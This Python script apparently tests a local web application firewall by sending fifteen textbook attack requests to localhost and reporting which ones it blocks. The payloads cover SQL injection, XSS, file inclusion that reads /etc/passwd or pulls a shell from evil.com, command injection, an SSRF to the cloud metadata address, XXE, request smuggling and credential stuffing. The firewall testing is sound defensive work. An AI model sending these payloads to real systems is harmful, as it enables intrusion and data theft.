import requests
import json
import time

TARGET_URL = "http://127.0.0.1:8080"
HEADERS = {"User-Agent": "WAF-Killer-Attacker"}

def test_attack(name, path, valid_status=403, method="GET", data=None, headers=None):
    url = f"{TARGET_URL}{path}"
    h = HEADERS.copy()
    if headers:
        h.update(headers)
        
    try:
        if method == "GET":
            response = requests.get(url, headers=h, allow_redirects=False, timeout=3)
        else:
            response = requests.post(url, data=data, headers=h, allow_redirects=False, timeout=3)
            
        status = response.status_code
        result = "✅ BLOCKED" if status == valid_status else f"❌ ALLOWED ({status})"
        
        # Check specific headers for WAF info
        waf_score = response.headers.get("X-WAF-Score", "N/A")
        
        print(f"| {name:<30} | {status:<6} | {result:<20} | Score: {waf_score:<5} |")
        time.sleep(0.5) # Be nice
        return status
    except Exception as e:
        print(f"| {name:<30} | ERR    | ❌ ERROR: {str(e)[:15]} |")
        return 0

print(f"\n{'='*75}")
print(f"🚀  LIVE ATTACK SIMULATION - WAF KILLER")
print(f"{'='*75}")
print(f"Target: {TARGET_URL}\n")
print(f"| {'ATTACK VECTOR':<30} | {'STATUS':<6} | {'RESULT':<20} | {'INFO':<12} |")
print(f"|{'-'*32}|{'-'*8}|{'-'*22}|{'-'*14}|")

# 1. SQL Injection
test_attack("1. SQL Injection (SQLi)", "/?q=' OR 1=1 --")
# 2. XSS
test_attack("2. XSS", "/?q=<script>alert(1)</script>")
# 3. LFI
test_attack("3. Local File Inclusion", "/?file=../../etc/passwd")
# 4. RFI
test_attack("4. Remote File Inclusion", "/?file=http://evil.com/shell")
# 5. RCE
test_attack("5. RCE / Command Injection", "/?cmd=;cat /etc/passwd")
# 6. Path Traversal
test_attack("6. Path Traversal (URI)", "/../../etc/passwd")
# 7. SSRF
test_attack("7. SSRF", "/?url=http://169.254.169.254/latest/")
# 8. XXE
test_attack("8. XXE", "/", method="POST", data='<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>', headers={"Content-Type": "application/xml"})
# 9. CSRF
test_attack("9. CSRF (Missing Token)", "/transfer", method="POST", data="amount=100", headers={"Cookie": "session=admin"})
# 10. Request Smuggling
test_attack("10. Request Smuggling", "/", method="POST", data="0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n", headers={"Content-Length": "5", "Transfer-Encoding": "chunked"})
# 11. Protocol Violation (Bad Host)
test_attack("11. Protocol Violation", "/", headers={"Host": ""})
# 12. Slowloris (Simulated)
# Skip actual slowloris as it takes too long, simulate via header/behavior check if feasible
test_attack("12. Application Layer DoS", "/?a=" + "A"*5000) # Large payload simulated
# 13. Credential Stuffing
test_attack("13. Credential Stuffing", "/login", method="POST", data='{"u":"admin","p":"123456"}', headers={"Content-Type": "application/json"})
# 14. IDOR
test_attack("14. IDOR (Anomaly)", "/user/1001")
# 15. Bot Traffic
test_attack("15. Bot / Scraper", "/", headers={"User-Agent": "curl/7.64.1"})

print(f"{'='*75}\n")
